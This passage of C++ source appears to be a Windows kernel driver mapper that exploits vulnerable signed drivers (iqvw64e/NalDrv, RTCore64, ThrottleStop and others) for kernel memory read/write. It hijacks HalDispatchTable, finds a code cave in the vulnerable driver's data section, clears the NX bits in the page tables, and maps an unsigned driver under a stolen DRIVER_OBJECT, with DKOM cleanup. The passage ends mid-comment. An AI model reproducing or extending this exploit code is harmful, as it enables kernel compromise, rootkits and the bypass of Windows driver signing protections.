                    Log("[*] Loading driver from: %s\n", finalPath.c_str());
                    svc = CreateServiceA(scm, svcTag, svcTag,
                        SERVICE_ALL_ACCESS, SERVICE_KERNEL_DRIVER, SERVICE_DEMAND_START,
                        SERVICE_ERROR_NORMAL, finalPath.c_str(), nullptr, nullptr, nullptr, nullptr, nullptr);
                    if (!svc && GetLastError() == 1072) {
                        Log("[*] Waiting for service deletion to complete...\n");
                        Sleep(2000);
                        svc = CreateServiceA(scm, svcTag, svcTag,
                            SERVICE_ALL_ACCESS, SERVICE_KERNEL_DRIVER, SERVICE_DEMAND_START,
                            SERVICE_ERROR_NORMAL, finalPath.c_str(), nullptr, nullptr, nullptr, nullptr, nullptr);
                    }
                    if (svc) {
                        if (!StartServiceA(svc, 0, nullptr)) {
                            DWORD startErr = GetLastError();
                            if (startErr == 1056) {
                                Log("[+] %s service already running (reused)\n", svcTag);
                            } else {
                                Log("[!] StartService failed: %u\n", startErr);
                            }
                        } else {
                            Log("[+] %s service started OK\n", svcTag);
                        }
                        Sleep(1000);
                        CloseServiceHandle(svc);
                    } else {
                        Log("[!] Failed to create %s service: %u\n", svcTag, GetLastError());
                    }
                } else {
                    Log("[!] %s not found — place next to mapper or in %%TEMP%%\n", sysFile);
                }
            } else {
                CloseServiceHandle(svc);
            }
            CloseServiceHandle(scm);
        }
        } // !driverAlreadyLoaded
    }

    std::string openErr;
    KernelPrimitives prim;
    if (g_useCorsair) {
        prim = OpenCorsair(openErr);
        if (!prim.ReadKernelMemory) {
            Log("OpenCorsair failed: %s\n", openErr.c_str());
            return 1;
        }
        Log("CorsairLLAccess opened OK (full-page mapping)\n"); fflush(stdout);
    } else if (g_useRtCore) {
        prim = OpenRtCore(openErr);
        if (!prim.ReadKernelMemory) {
            Log("OpenRtCore failed: %s\n", openErr.c_str());
            return 1;
        }
        Log("RTCore64 opened OK\n");
    } else if (g_useSivDriver) {
        prim = OpenSivDriver(openErr);
        if (!prim.ReadKernelMemory) {
            Log("OpenSivDriver failed: %s\n", openErr.c_str());
            return 1;
        }
        Log("SIVX64 opened OK\n");
    } else if (g_useTrixx) {
        prim = OpenTrixx(openErr);
        if (!prim.ReadKernelMemory) {
            Log("OpenTrixx failed: %s\n", openErr.c_str());
            return 1;
        }
        Log("TRIXX opened OK\n"); fflush(stdout);
    } else if (g_useThrottleStop) {
        prim = OpenThrottleStop(openErr);
        if (!prim.ReadKernelMemory) {
            Log("OpenThrottleStop failed: %s\n", openErr.c_str());
            return 1;
        }
        Log("ThrottleStop opened OK\n");
    } else if (g_useNal) {
        prim = OpenNalDrv(openErr);
        if (!prim.ReadKernelMemory) {
            Log("OpenNalDrv failed: %s\n", openErr.c_str());
            return 1;
        }
        Log("NalDrv opened OK\n");
    } else {
        Log("[!] No BYOVD driver selected\n");
        return 1;
    }

    // ntoskrnl base via NtQuerySystemInformation class 0x0B
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    auto NtQSI = reinterpret_cast<NTSTATUS(NTAPI*)(ULONG,PVOID,ULONG,PULONG)>(
        GetProcAddress(hNtdll, "NtQuerySystemInformation"));

    ULONG needed = 0;
    NtQSI(0x0B, nullptr, 0, &needed);
    needed += 0x1000;
    std::vector<uint8_t> modBuf(needed);
    NtQSI(0x0B, modBuf.data(), needed, &needed);

    struct MOD_INFO { HANDLE s; PVOID mb; PVOID ib; ULONG is,fl; USHORT lo,io,lc,on; char fp[256]; };
    struct MOD_LIST { ULONG n; MOD_INFO m[1]; };
    auto* mlist = reinterpret_cast<MOD_LIST*>(modBuf.data());
    uint64_t kernelBase = 0;
    for (ULONG i = 0; i < mlist->n; ++i) {
        if (_stricmp(mlist->m[i].fp + mlist->m[i].on, "ntoskrnl.exe") == 0) {
            kernelBase = reinterpret_cast<uint64_t>(mlist->m[i].ib);
            break;
        }
    }
    if (!kernelBase) { Log("ntoskrnl base not found\n"); fflush(stdout); return 1; }
    Log("ntoskrnl    : 0x%llx\n", (unsigned long long)kernelBase); fflush(stdout);

    // Smoke-test the kernel R/W primitive: read first 2 bytes of ntoskrnl (must be "MZ")
    // TRIXX skips this check — Windows zeroes ntoskrnl PE header in physical memory;
    // CR3 was already validated via majority-vote in TrixxBootstrapCR3.
    {
        uint16_t mz = 0;
        bool smokeOK = prim.ReadKernelMemory(&mz, kernelBase, 2) && mz == 0x5A4D;
        if ((g_useTrixx || g_useCorsair) && !smokeOK) {
            Log("%s: MZ header zeroed (expected on modern Win10), using validated CR3\n", g_useCorsair ? "Corsair" : "TRIXX");
            fflush(stdout);
            smokeOK = true;
        }
        if (!smokeOK) {
            Log("BYOVD smoke-test FAILED: mz=0x%04x (NalDrv dispatch corrupted)\n", mz);
            Log("Checking if Betest driver is already loaded from previous session...\n");
            bool betestAlive = false;
            char devBuf[64];
            for (int p = 0; p < DYN_PREFIX_COUNT && !betestAlive; p++) {
                for (int d = 0; d < 10 && !betestAlive; d++) {
                    sprintf_s(devBuf, "\\\\.\\%s%d", g_dynDevPrefixes[p], d);
                    HANDLE h = CreateFileA(devBuf, GENERIC_READ | GENERIC_WRITE,
                        FILE_SHARE_READ | FILE_SHARE_WRITE,
                        nullptr, OPEN_EXISTING, 0, nullptr);
                    if (h != INVALID_HANDLE_VALUE) {
                        Log("Betest device found: %s — skipping mapping\n", devBuf);
                        CloseHandle(h);
                        betestAlive = true;
                    }
                }
            }
            if (betestAlive) {
                goto skip_mapping;
            }
            Log("Betest not found either. Reboot required for fresh driver state.\n");
            return 1;
        }
        Log("BYOVD smoke : MZ OK (kernel R/W verified)\n");
    }

    // HalDispatchTable+8 kernel VA
    HMODULE hNtos = LoadLibraryExA("ntoskrnl.exe", nullptr, DONT_RESOLVE_DLL_REFERENCES);
    if (!hNtos) { Log("Failed to load ntoskrnl.exe as data\n"); return 1; }
    uint64_t halUser = reinterpret_cast<uint64_t>(GetProcAddress(hNtos, "HalDispatchTable"));
    if (!halUser) { Log("HalDispatchTable not found\n"); FreeLibrary(hNtos); return 1; }
    uint64_t halKernelVA = kernelBase + (halUser - reinterpret_cast<uint64_t>(hNtos)) + 8;

    // Resolve PsLoadedModuleList kernel VA before freeing hNtos (needed for DKOM cleanup)
    {
        auto psUser = reinterpret_cast<uint64_t>(GetProcAddress(hNtos, "PsLoadedModuleList"));
        if (psUser) g_psLoadedModuleListKVA = kernelBase + (psUser - reinterpret_cast<uint64_t>(hNtos));
    }
    g_primForCleanup = prim;

    FreeLibrary(hNtos);
    Log("HAL+8 VA    : 0x%llx\n", (unsigned long long)halKernelVA);

    // PteBase needed to clear NX bit on mapped image/stub pages (NOT for shellcode cave)
    uint64_t pteBase = FindPteBase(prim, kernelBase);
    Log("PteBase     : 0x%llx\n", (unsigned long long)pteBase);

    // Find BYOVD driver kernel base from module list for code cave
    uint64_t nalBase = 0; uint32_t nalSize = 0;
    for (ULONG i = 0; i < mlist->n; ++i) {
        const char* name = mlist->m[i].fp + mlist->m[i].on;
        bool match = false;
        if (g_useCorsair)
            match = _stricmp(name, "CorsairLLAccess64.sys") == 0;
        else if (g_useSivDriver)
            match = _stricmp(name, "SIVX64.sys") == 0;
        else if (g_useTrixx)
            match = _stricmp(name, "TRIXX.sys") == 0;
        else if (g_useThrottleStop)
            match = _stricmp(name, "ThrottleStop.sys") == 0;
        else if (g_useNal)
            match = _stricmp(name, XS("iqvw64e.sys").c_str()) == 0
                 || _stricmp(name, XS("NalDrvIntel.sys").c_str()) == 0
                 || _stricmp(name, XS("NalDrv.sys").c_str()) == 0;
        else
            match = _stricmp(name, "TRIXX.sys") == 0;
        if (match) {
            nalBase = reinterpret_cast<uint64_t>(mlist->m[i].ib);
            nalSize = mlist->m[i].is;
            Log("BYOVD base  : 0x%llx size=0x%x [%s]\n",
                (unsigned long long)nalBase, (unsigned)nalSize, name);
            break;
        }
    }
    if (!nalBase && !g_useThrottleStop) {
        for (ULONG i = 0; i < mlist->n && !nalBase; ++i) {
            const char* name = mlist->m[i].fp + mlist->m[i].on;
            if (_stricmp(name, XS("NalDrv.sys").c_str()) == 0) {
                nalBase = reinterpret_cast<uint64_t>(mlist->m[i].ib);
                nalSize = mlist->m[i].is;
                Log("BYOVD base  : 0x%llx size=0x%x [%s]\n",
                    (unsigned long long)nalBase, (unsigned)nalSize, name);
            }
        }
    }
    if (!nalBase) {
        Log("BYOVD driver not found in module list, trying handle-based lookup...\n");
        HANDLE hNalProbe = CreateFileA("\\\\.\\Nal", GENERIC_READ | GENERIC_WRITE,
                                        FILE_SHARE_READ | FILE_SHARE_WRITE,
                                        nullptr, OPEN_EXISTING, 0, nullptr);
        if (hNalProbe == INVALID_HANDLE_VALUE) {
            Log("  Failed to open \\.\\ Nal for probe: err=%lu\n", GetLastError());
        } else {
            Log("  Probe handle: 0x%llx  PID=%lu\n", (unsigned long long)(uintptr_t)hNalProbe, GetCurrentProcessId());
            // Use SystemExtendedHandleInformation (class 64) — supports PID > 65535
            ULONG hiNeeded = 1024 * 1024;
            NTSTATUS st;
            std::vector<uint8_t> hiBuf;
            for (int attempt = 0; attempt < 8; attempt++) {
                hiBuf.resize(hiNeeded);
                st = NtQSI(64, hiBuf.data(), hiNeeded, &hiNeeded);
                if (st == 0) break; // STATUS_SUCCESS
                if (st == (NTSTATUS)0xC0000004) { hiNeeded *= 2; continue; } // STATUS_INFO_LENGTH_MISMATCH
                break;
            }
            if (st == 0) {
                struct SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX {
                    PVOID Object; ULONG_PTR UniqueProcessId; ULONG_PTR HandleValue;
                    ULONG GrantedAccess; USHORT CreatorBackTraceIndex; USHORT ObjectTypeIndex;
                    ULONG HandleAttributes; ULONG Reserved;
                };
                struct SYSTEM_HANDLE_INFORMATION_EX {
                    ULONG_PTR NumberOfHandles; ULONG_PTR Reserved;
                    SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX Handles[1];
                };
                auto* hi = (SYSTEM_HANDLE_INFORMATION_EX*)hiBuf.data();
                ULONG_PTR myPid = GetCurrentProcessId();
                ULONG_PTR targetHandle = (ULONG_PTR)hNalProbe;
                Log("  Searching %llu handles for PID=%llu handle=0x%llx\n",
                    (unsigned long long)hi->NumberOfHandles, (unsigned long long)myPid,
                    (unsigned long long)targetHandle);
                for (ULONG_PTR i = 0; i < hi->NumberOfHandles && !nalBase; i++) {
                    if (hi->Handles[i].UniqueProcessId == myPid &&
                        hi->Handles[i].HandleValue == targetHandle) {
                        // Object is FILE_OBJECT, not DEVICE_OBJECT
                        uint64_t fileObj = (uint64_t)hi->Handles[i].Object;
                        Log("  FileObject KVA: 0x%llx\n", (unsigned long long)fileObj);
                        // FILE_OBJECT+0x08 = DeviceObject
                        uint64_t deviceObj = 0;
                        prim.ReadKernelMemory(&deviceObj, fileObj + 0x08, 8);
                        Log("  DeviceObject: 0x%llx\n", (unsigned long long)deviceObj);
                        // DEVICE_OBJECT+0x08 = DriverObject
                        uint64_t driverObj = 0;
                        if (deviceObj) prim.ReadKernelMemory(&driverObj, deviceObj + 0x08, 8);
                        Log("  DriverObject: 0x%llx\n", (unsigned long long)driverObj);
                        if (driverObj) {
                            // DRIVER_OBJECT+0x18 = DriverStart, +0x20 = DriverSize
                            prim.ReadKernelMemory(&nalBase, driverObj + 0x18, 8);
                            prim.ReadKernelMemory(&nalSize, driverObj + 0x20, 4);
                            Log("  DriverStart=0x%llx  DriverSize=0x%x\n",
                                (unsigned long long)nalBase, nalSize);
                            // If DriverStart was zeroed by Betest DriverEntry, try DriverSection
                            if (!nalBase) {
                                uint64_t drvSection = 0;
                                prim.ReadKernelMemory(&drvSection, driverObj + 0x28, 8);
                                Log("  DriverSection: 0x%llx\n", (unsigned long long)drvSection);
                                if (drvSection) {
                                    prim.ReadKernelMemory(&nalBase, drvSection + 0x30, 8);
                                    prim.ReadKernelMemory(&nalSize, drvSection + 0x40, 4);
                                    Log("  LDR DllBase=0x%llx  SizeOfImage=0x%x\n",
                                        (unsigned long long)nalBase, nalSize);
                                }
                            }
                            // If still zero, scan IRP handler to find module base
                            if (!nalBase) {
                                uint64_t irpHandler = 0;
                                prim.ReadKernelMemory(&irpHandler, driverObj + 0xE0, 8);
                                Log("  IRP_MJ_DEVICE_CONTROL: 0x%llx\n", (unsigned long long)irpHandler);
                                if (irpHandler > 0xFFFF000000000000ULL) {
                                    uint64_t probe = irpHandler & ~0xFFFULL;
                                    for (int pg = 0; pg < 256; pg++, probe -= 0x1000) {
                                        uint16_t mz = 0;
                                        if (prim.ReadKernelMemory(&mz, probe, 2) && mz == 0x5A4D) {
                                            uint32_t peOff = 0;
                                            prim.ReadKernelMemory(&peOff, probe + 0x3C, 4);
                                            uint32_t peSig = 0;
                                            if (peOff < 0x1000)
                                                prim.ReadKernelMemory(&peSig, probe + peOff, 4);
                                            if (peSig == 0x4550) {
                                                nalBase = probe;
                                                prim.ReadKernelMemory(&nalSize, probe + peOff + 0x50, 4);
                                                Log("  MZ scan base=0x%llx size=0x%x\n",
                                                    (unsigned long long)nalBase, nalSize);
                                                break;
                                            }
                                        }
                                    }
                                }
                            }
                        }
                        break;
                    }
                }
            } else {
                Log("  NtQSI(64) failed: 0x%08x\n", (unsigned)st);
            }
            CloseHandle(hNalProbe);
        }
        if (!nalBase) { Log("BYOVD driver not found by any method\n"); return 1; }
        Log("BYOVD base (handle fallback): 0x%llx size=0x%x\n", (unsigned long long)nalBase, nalSize);
    }

    // ── Code cave search in NalDrv .data ──────────────────────────────────────
    //
    // Find the LARGEST run of padding bytes (0x00, 0xCC, 0x90) in a writable
    // non-executable NalDrv section.  Prefer caves that fit entirely within a
    // single 4KB page to minimize the number of PTEs we need to NX-clear.
    //
    // Requirements:
    //   - Minimum 128 bytes (enough for our largest shellcode: IPI callback +
    //     HAL dispatch = ~120 bytes total)
    //   - 16-byte aligned start for reliable instruction fetch on bare metal
    //   - Prefer single-page caves over cross-page caves of the same size
    //   - Track exact cave size so we can bounds-check shellcode writes
    uint64_t caveKVA = 0;
    size_t   caveSize = 0;
    {
        struct CaveCandidate {
            uint64_t kva;        // 16-byte aligned start
            size_t   size;       // usable bytes after alignment
            bool     singlePage; // fits entirely in one 4KB page
        };
        CaveCandidate best = {0, 0, false};

        // Diagnostic: trace page table walk for BYOVD VA (safe — validate PAs)
        if (prim.ReadPhysicalMemory && prim.cr3) {
            uint64_t va = nalBase;
            uint64_t cr3p = prim.cr3 & 0x000FFFFFFFFFF000ULL;
            constexpr uint64_t MAX_PHYS = 0x200000000ULL; // 8GB sanity cap
            auto idx = [&](int shift) { return (va >> shift) & 0x1FFULL; };
            auto validPA = [](uint64_t entry) -> uint64_t {
                uint64_t pa = entry & 0x000FFFFFFFFFF000ULL;
                return (pa < 0x200000000ULL) ? pa : 0;
            };
            uint64_t pml4e = 0, pdpte = 0, pde = 0, pte = 0;
            prim.ReadPhysicalMemory(&pml4e, cr3p + idx(39)*8, 8);
            Log("Cave diag: VA=0x%llx PML4[%llu]=0x%llx\n",
                (unsigned long long)va, idx(39), (unsigned long long)pml4e);
            if ((pml4e & 1) && validPA(pml4e)) {
                prim.ReadPhysicalMemory(&pdpte, validPA(pml4e) + idx(30)*8, 8);
                Log("  PDPT[%llu]=0x%llx\n", idx(30), (unsigned long long)pdpte);
                if ((pdpte & 1) && validPA(pdpte)) {
                    prim.ReadPhysicalMemory(&pde, validPA(pdpte) + idx(21)*8, 8);
                    Log("  PD[%llu]=0x%llx\n", idx(21), (unsigned long long)pde);
                    if ((pde & 1) && validPA(pde)) {
                        if (pde & (1ULL<<7)) {
                            Log("  2MB large page → phys=0x%llx\n",
                                (unsigned long long)(validPA(pde) | (va & 0x1FFFFF)));
                        } else {
                            prim.ReadPhysicalMemory(&pte, validPA(pde) + idx(12)*8, 8);
                            Log("  PT[%llu]=0x%llx → phys=0x%llx\n", idx(12),
                                (unsigned long long)pte,
                                (unsigned long long)(validPA(pte) | (va & 0xFFF)));
                        }
                    }
                } else if (pdpte & 1) {
                    Log("  PDPT entry PA 0x%llx exceeds max — skipping\n",
                        (unsigned long long)(pdpte & 0x000FFFFFFFFFF000ULL));
                }
            }
            fflush(stdout);
        }

        uint8_t nalHdr[0x400] = {};
        IMAGE_NT_HEADERS64* caveNth = nullptr;
        IMAGE_SECTION_HEADER* caveSec = nullptr;

        bool nalHdrOK = prim.ReadKernelMemory(nalHdr, nalBase, sizeof(nalHdr));
        Log("Cave: BYOVD hdr read %s (MZ=0x%04x)\n",
            nalHdrOK ? "OK" : "FAIL",
            nalHdrOK ? *(uint16_t*)nalHdr : 0);
        fflush(stdout);

        HMODULE hDiskByovd = nullptr;
        if (nalHdrOK && *(uint16_t*)nalHdr == 0x5A4D) {
            auto* dos = reinterpret_cast<IMAGE_DOS_HEADER*>(nalHdr);
            caveNth = reinterpret_cast<IMAGE_NT_HEADERS64*>(nalHdr + dos->e_lfanew);
            caveSec = IMAGE_FIRST_SECTION(caveNth);
        } else {
            const char* sysFile = g_useCorsair ? "CorsairLLAccess64.sys" : (g_useNal ? "NalDrvIntel.sys" : (g_useSivDriver ? "SIVX64.sys" : (g_useThrottleStop ? "ThrottleStop.sys" : "TRIXX.sys")));
            Log("Cave: loading %s from disk for section layout\n", sysFile);
            char selfDir[MAX_PATH];
            GetModuleFileNameA(nullptr, selfDir, MAX_PATH);
            *strrchr(selfDir, '\\') = 0;
            char diskPath[MAX_PATH];
            snprintf(diskPath, MAX_PATH, "%s\\%s", selfDir, sysFile);
            hDiskByovd = LoadLibraryExA(diskPath, nullptr, DONT_RESOLVE_DLL_REFERENCES);
            if (!hDiskByovd) {
                Log("Cave: disk load failed (err=%lu), trying system path\n", GetLastError());
                hDiskByovd = LoadLibraryExA(sysFile, nullptr, DONT_RESOLVE_DLL_REFERENCES);
            }
            if (hDiskByovd) {
                auto* dd = reinterpret_cast<IMAGE_DOS_HEADER*>(hDiskByovd);
                caveNth = reinterpret_cast<IMAGE_NT_HEADERS64*>((uint8_t*)hDiskByovd + dd->e_lfanew);
                caveSec = IMAGE_FIRST_SECTION(caveNth);
                Log("Cave: disk PE loaded, %u sections\n", caveNth->FileHeader.NumberOfSections);
            } else {
                Log("Cave: disk load also failed (err=%lu)\n", GetLastError());
            }
        }

        if (caveNth && caveSec) {
            for (WORD i = 0; i < caveNth->FileHeader.NumberOfSections; i++) {
                if (!(caveSec[i].Characteristics & IMAGE_SCN_MEM_WRITE)) continue;
                if (caveSec[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) continue;
                uint64_t secKVA  = nalBase + caveSec[i].VirtualAddress;
                uint32_t secSize = (caveSec[i].Misc.VirtualSize > caveSec[i].SizeOfRawData)
                    ? caveSec[i].Misc.VirtualSize : caveSec[i].SizeOfRawData;
                Log("Cave scan: [%.8s] VA=0x%x VSize=0x%x RawSz=0x%x\n",
                    (const char*)caveSec[i].Name, caveSec[i].VirtualAddress,
                    caveSec[i].Misc.VirtualSize, caveSec[i].SizeOfRawData);
                const size_t CHUNK = 4096;
                std::vector<uint8_t> chunk(CHUNK);

                // Track runs across chunk boundaries
                size_t   runLen   = 0;
                uint64_t runStart = 0;

                for (uint32_t off = 0; off < secSize; off += (uint32_t)CHUNK) {
                    size_t rsz = ((size_t)(secSize - off) < CHUNK) ? (size_t)(secSize - off) : CHUNK;
                    if (!prim.ReadKernelMemory(chunk.data(), secKVA + off, rsz)) {
                        runLen = 0;  // reset on read failure
                        continue;
                    }
                    for (size_t j = 0; j < rsz; j++) {
                        uint8_t b = chunk[j];
                        if (b == 0x00 || b == 0xCC || b == 0x90) {
                            if (runLen == 0) runStart = secKVA + off + j;
                            runLen++;
                        } else {
                            if (runLen >= 128) {
                                // Evaluate this cave
                                uint64_t aligned = (runStart + 15) & ~15ULL;
                                size_t usable = (runLen > (size_t)(aligned - runStart))
                                    ? runLen - (size_t)(aligned - runStart) : 0;
                                if (usable >= 128) {
                                    bool single = ((aligned & ~0xFFFULL) ==
                                                   ((aligned + usable - 1) & ~0xFFFULL));
                                    // Prefer: (1) single-page over cross-page, (2) larger
                                    bool isBetter = false;
                                    if (!best.kva) isBetter = true;
                                    else if (single && !best.singlePage) isBetter = true;
                                    else if (single == best.singlePage && usable > best.size)
                                        isBetter = true;
                                    if (isBetter) {
                                        best = {aligned, usable, single};
                                    }
                                }
                            }
                            runLen = 0;
                        }
                    }
                }
                // End-of-section: check final run
                if (runLen >= 128) {
                    uint64_t aligned = (runStart + 15) & ~15ULL;
                    size_t usable = (runLen > (size_t)(aligned - runStart))
                        ? runLen - (size_t)(aligned - runStart) : 0;
                    if (usable >= 128) {
                        bool single = ((aligned & ~0xFFFULL) ==
                                       ((aligned + usable - 1) & ~0xFFFULL));
                        bool isBetter = false;
                        if (!best.kva) isBetter = true;
                        else if (single && !best.singlePage) isBetter = true;
                        else if (single == best.singlePage && usable > best.size)
                            isBetter = true;
                        if (isBetter) best = {aligned, usable, single};
                    }
                }
            }
        }
        if (best.kva) {
            caveKVA  = best.kva;
            caveSize = best.size;
            Log("Code cave   : 0x%llx  size=%zu  singlePage=%d  (NalDrv .data, 16B-aligned)\n",
                (unsigned long long)caveKVA, caveSize, (int)best.singlePage);
        }
        if (hDiskByovd) FreeLibrary(hDiskByovd);
    }
    if (!caveKVA) { Log("No code cave found in NalDrv writable section\n"); return 1; }
    g_caveSize = caveSize;  // expose to KernelAlloc for bounds checking

    // ── NX clear for ALL cave pages ────────────────────────────────────────────
    //
    // The cave may span a 4KB page boundary (e.g. cave starts at 0x...FE0 and
    // extends 128 bytes past the next page).  We must clear NX on EVERY page
    // the cave touches.  After clearing, we verify the PTE readback to confirm
    // XD=0 stuck (catches PatchGuard re-set race).
    {
        uint64_t caveStartPage = caveKVA & ~0xFFFULL;
        uint64_t caveEndPage   = (caveKVA + caveSize - 1) & ~0xFFFULL;
        uint32_t pagesCleared  = 0;

        for (uint64_t page = caveStartPage; page <= caveEndPage; page += 0x1000) {
            uint64_t pteAddr = pteBase + ((page >> 9) & 0x7FFFFFFFF8ULL);
            uint64_t pte = 0;
            if (!prim.ReadKernelMemory(&pte, pteAddr, 8) || !(pte & 1)) {
                Log("Cave NX clr : PTE read failed or not present for page 0x%llx\n",
                    (unsigned long long)page);
                continue;
            }
            uint64_t newPte = pte & ~(1ULL << 63);
            if (newPte != pte) {
                prim.WriteKernelMemory(pteAddr, &newPte, 8);

                // Verify: re-read PTE to confirm XD=0 persisted
                uint64_t verifyPte = 0;
                prim.ReadKernelMemory(&verifyPte, pteAddr, 8);
                if (verifyPte & (1ULL << 63)) {
                    Log("Cave NX clr : WARNING — XD=0 did not persist for page 0x%llx "
                        "(PatchGuard race?), retrying...\n", (unsigned long long)page);
                    // Retry once after a short yield
                    Sleep(1);
                    prim.WriteKernelMemory(pteAddr, &newPte, 8);
                }
            }
            Log("Cave NX clr : page=0x%llx pte=0x%llx->0x%llx\n",
                (unsigned long long)page,
                (unsigned long long)pte, (unsigned long long)newPte);
            pagesCleared++;
        }
        Log("Cave NX clr : %u page(s) cleared for cave [0x%llx .. +0x%zx]\n",
            pagesCleared, (unsigned long long)caveKVA, caveSize);
    }

    // ── TLB pre-warm: write+read cycle on every cave page ───────────────────
    //
    // On bare metal, D-TLB and I-TLB are SEPARATE caches.  A read-only probe
    // populates the D-TLB but NOT the I-TLB.  However, a write forces a full
    // TLB entry load (with correct PTE flags including XD=0) that is shared
    // between D-TLB and unified STLB.  When execution later tries to fetch
    // from the same page, the STLB hit returns XD=0 → no #PF.
    //
    // Strategy: write a known byte pattern, read it back, then restore.
    // This forces the maximum-privilege TLB fill (W=1 + XD=0).
    {
        uint64_t caveStartPage = caveKVA & ~0xFFFULL;
        uint64_t caveEndPage   = (caveKVA + caveSize - 1) & ~0xFFFULL;

        for (uint64_t page = caveStartPage; page <= caveEndPage; page += 0x1000) {
            // Pick an offset inside the cave for this page (or page start if outside cave)
            uint64_t probeAddr = (page >= caveKVA) ? page : caveKVA;

            uint8_t origByte = 0;
            prim.ReadKernelMemory(&origByte, probeAddr, 1);

            // Write a different byte to force a write-fault TLB fill
            uint8_t marker = origByte ^ 0xFF;
            prim.WriteKernelMemory(probeAddr, &marker, 1);

            // Read back to verify the write took AND populate the D-TLB entry
            uint8_t readback = 0;
            prim.ReadKernelMemory(&readback, probeAddr, 1);

            // Restore original byte
            prim.WriteKernelMemory(probeAddr, &origByte, 1);

            Log("Cave warm   : page=0x%llx probe=0x%llx (write+read+restore cycle)\n",
                (unsigned long long)page, (unsigned long long)probeAddr);
        }
    }

    // Wire AllocateKernelMemory — shellcode in NalDrv .data cave (NX cleared above)
    prim.AllocateKernelMemory = [&](size_t sz) -> uint64_t {
        return KernelAlloc(prim, kernelBase, halKernelVA, caveKVA, sz);
    };

    // Read GmrDrv image
    auto image = ReadFileBin(argv[1]);
    if (image.empty()) { Log("Failed to read %s\n", argv[1]); return 1; }
    Log("GmrDrv.sys loaded: %zu bytes, starting ManualMap...\n", image.size());

    auto result = ManualMap(image, prim);
    if (!result.success) {
        Log("Mapping failed: %s\n", result.error.c_str());
        return 1;
    }
    std::cout << "Image base  : 0x" << std::hex << result.imageBase  << "\n";
    std::cout << "Entry point : 0x" << std::hex << result.entryPoint << "\n";

    // Find NalDrv's REAL DRIVER_OBJECT via handle table enumeration.
    // Fake DRIVER_OBJECTs BSOD because IoCreateDevice internally calls into the
    // Object Manager which decodes OBJECT_HEADER.TypeIndex (XOR'd with ObHeaderCookie)
    // — TypeIndex=0 decodes to a garbage ObpObjectTypes[] slot → null deref → BSOD.
    // Instead: open \\.\Nal again to get a known handle, use NtQuerySystemInformation
    // (class 0x40 = SystemExtendedHandleInformation) to get its FILE_OBJECT kernel VA,
    // then read FILE_OBJECT+8 (DeviceObject) and DeviceObject+8 (DriverObject).
    // GmrDrv!DriverEntry with NalDrv's real DRIVER_OBJECT will call IoCreateDevice
    // successfully (valid object header, correct TypeIndex) and install \\Device\\GmrAccess
    // under NalDrv's DriverObject.  NalDrv's MajorFunction table gets overwritten with
    // GmrDrv's dispatch routines — that's fine since we no longer need NalDrv IOCTLs.

    uint64_t rcxVal = 0;   // NalDrv's real DRIVER_OBJECT kernel VA

    HANDLE hNal2 = CreateFileA("\\\\.\\Nal",
        GENERIC_READ | GENERIC_WRITE,
        FILE_SHARE_READ | FILE_SHARE_WRITE,
        nullptr, OPEN_EXISTING, 0, nullptr);

    if (hNal2 != INVALID_HANDLE_VALUE) {
        // SystemExtendedHandleInformation (0x40)
        // SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX layout (x64):
        //   +0:  Object          (uint64) — kernel object VA
        //   +8:  UniqueProcessId (uint64)
        //   +16: HandleValue     (uint64)
        //   +24: GrantedAccess   (uint32)
        //   +28: CreatorBackTrace(uint16)
        //   +30: ObjectTypeIndex (uint16)
        //   +32: HandleAttributes(uint32)
        //   +36: Reserved        (uint32)
        // Header: NumberOfHandles(uint64), Reserved(uint64), then entries
        struct HE {
            uint64_t Object;
            uint64_t UniqueProcessId;
            uint64_t HandleValue;
            uint32_t GrantedAccess;
            uint16_t CreatorBackTrace;
            uint16_t ObjectTypeIndex;
            uint32_t HandleAttributes;
            uint32_t Reserved;
        };
        static_assert(sizeof(HE) == 40, "HE size mismatch");
        struct HT {
            uint64_t NumberOfHandles;
            uint64_t Reserved;
            HE Handles[1];
        };

        // Retry with growing buffer — 0x40 may return STATUS_INFO_LENGTH_MISMATCH
        // if first probe returns needed=0 and the system has many handles.
        ULONG needed = 0x80000; // 512 KB initial
        std::vector<uint8_t> hbuf;
        NTSTATUS hst = (NTSTATUS)0xC0000004; // STATUS_INFO_LENGTH_MISMATCH
        for (int tries = 0; tries < 8 && hst == (NTSTATUS)0xC0000004L; tries++) {
            hbuf.assign(needed, 0);
            ULONG retNeeded = 0;
            hst = NtQSI(0x40, hbuf.data(), needed, &retNeeded);
            if (hst == (NTSTATUS)0xC0000004L)
                needed = retNeeded ? retNeeded + 0x10000 : needed * 2;
        }
        if (NT_SUCCESS(hst)) {
            auto* ht = reinterpret_cast<HT*>(hbuf.data());
            uint64_t myPid = static_cast<uint64_t>(GetCurrentProcessId());
            uint64_t hVal  = static_cast<uint64_t>(reinterpret_cast<uintptr_t>(hNal2));

            for (uint64_t i = 0; i < ht->NumberOfHandles; i++) {
                auto& e = ht->Handles[i];
                if (e.UniqueProcessId != myPid) continue;
                if (e.HandleValue     != hVal)  continue;

                // e.Object is the FILE_OBJECT kernel VA
                uint64_t fileKva = e.Object;
                Log("FILE_OBJECT KVA : 0x%llx\n", (unsigned long long)fileKva);

                // FILE_OBJECT.DeviceObject at +8
                uint64_t devKva = 0;
                if (!prim.ReadKernelMemory(&devKva, fileKva + 8, 8) || !devKva) {
                    Log("Failed to read DeviceObject from FILE_OBJECT\n");
                    break;
                }
                Log("DeviceObject KVA: 0x%llx\n", (unsigned long long)devKva);

                // DEVICE_OBJECT.DriverObject at +8
                uint64_t drvKva = 0;
                if (!prim.ReadKernelMemory(&drvKva, devKva + 8, 8) || !drvKva) {
                    Log("Failed to read DriverObject from DeviceObject\n");
                    break;
                }
                Log("NalDrv DriverObject: 0x%llx\n", (unsigned long long)drvKva);
                rcxVal = drvKva;
                break;
            }
        } else {
            Log("NtQSI(0x40) failed: 0x%08x\n", (unsigned)hst);
        }
        CloseHandle(hNal2);
    } else {
        Log("Failed to open \\\\.\\Nal for DriverObject lookup (err=%u)\n",
            (unsigned)GetLastError());
    }

    if (!rcxVal) {
        Log("ERROR: could not find NalDrv DRIVER_OBJECT — aborting\n");
        return 1;
    }

    // Trampoline with HAL self-restore:
    //   sub rsp,28h
    //   mov rcx, DriverObject / xor rdx,rdx / mov rax, entryPoint / call rax
    //   mov rax, originalHalValue     ; embedded immediate (not read from memory!)
    //   mov rcx, halKernelVA
    //   mov [rcx], rax                ; restore HAL pointer
